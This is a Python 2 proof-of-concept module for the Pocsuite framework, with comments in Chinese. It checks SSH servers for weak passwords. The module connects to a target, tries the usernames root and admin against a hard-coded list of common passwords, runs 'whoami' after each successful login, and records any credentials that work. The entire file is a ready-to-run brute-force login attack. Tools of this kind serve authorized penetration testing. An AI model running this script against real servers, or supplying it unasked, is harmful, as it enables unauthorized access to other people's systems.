#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
#requests 
from pocsuite.api.request import req
#register
from pocsuite.api.poc import register
#report
from pocsuite.api.poc import Output, POCBase
#url转换host
from pocsuite.lib.utils.funs import url2ip

#基础基类
class SSHPOC(POCBase):
    vulID = '35'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2018-05-22' #漏洞公开的时间,不知道就写今天

    author = 'xiaohuihui1' #  PoC作者的大名
    createDate = '2018-05-22'# 编写 PoC 的日期
    updateDate = '2018-05-22'# PoC 更新的时间,默认和编写时间一样
    references="http://www.freebuf.com/articles/system/11424.html"
    name = 'ssh Unauthorized access'# PoC 名称
    appPowerLink = 'http://www.openssh.com/'# 漏洞厂商主页地址
    appName = 'ssh'# 漏洞应用名称
    appVersion = 'all versions'# 漏洞影响版本
    vulType = 'Weak-Password'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        ssh 存在弱口令
    ''' # 漏洞简要描述
    samples = []# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"严重" #严重,高危,中危,低危

    #指纹方法
    def _fingerprint(self):
        pass
        
    def _verify(self):
        result={}
        vul_url = '%s' % self.url
        import re
        import time
        import paramiko
        from pocsuite.lib.utils.funs import url2ip
        _port = re.findall(':(\d+)\s*', vul_url)
        if len(_port) != 0:
            _host = url2ip(vul_url)[0]
            _port = int(url2ip(vul_url)[1])
        else :
            _host = url2ip(vul_url)
            _port = 22

        #判断端口是否开放   
        import socket
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(1)
        try:
            sk.connect((_host,_port))
            #print 'Server port is OK!'
        except Exception:
           return self.save_output(result)
        sk.close()


        flag = False
        payload = "弱口令"
        username = ["root","admin",]
        password = ["","toor","1234","123456","admin","Admin","ADMIN","admin123","Admin123","root","root123","123.com"'123456','admin','root','password','123123','123','1','',
            'P@ssw0rd!!','qwa123','12345678','test','123qwe!@#',
          '123456789','123321','1314520','666666','woaini','fuckyou','000000',
          '1234567890','8888888','qwerty','1qaz2wsx','abc123','abc123456',
          '1q2w3e4r','123qwe','159357','p@ssw0rd','p@55w0rd','password!',
          'p@ssw0rd!','password1','r00t','system','111111','admin',"1","toor","1234","123456","admin","Admin","ADMIN","admin123","Admin123","root","root123","123.com","ct123!@#"]
        for u in username:
            for p in password:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    print p
                    ssh.connect(hostname=_host, port=_port, username=u, password=p,timeout=1,allow_agent=False,look_for_keys = False)
                    #执行命令
                    stdin, stdout, stderr = ssh.exec_command('whoami',timeout=1)
                    #获取命令结果
                    resultname = stdout.read().split("\n")[0]
                    if resultname == u:
                        payload += str(u) + ":" +str(p)
                        result['VerifyInfo'] = {}
                        result['VerifyInfo']['URL'] = _host
                        result['VerifyInfo']['Payload'] = payload
                    ssh.close()
                except Exception,ex:
                    ssh.close()
        print '[+]35 poc done'
        return self.save_output(result)
    #攻击模块
    def _attack(self):
        result = {}
        return self._verify()


    #输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


#注册类
register(SSHPOC)
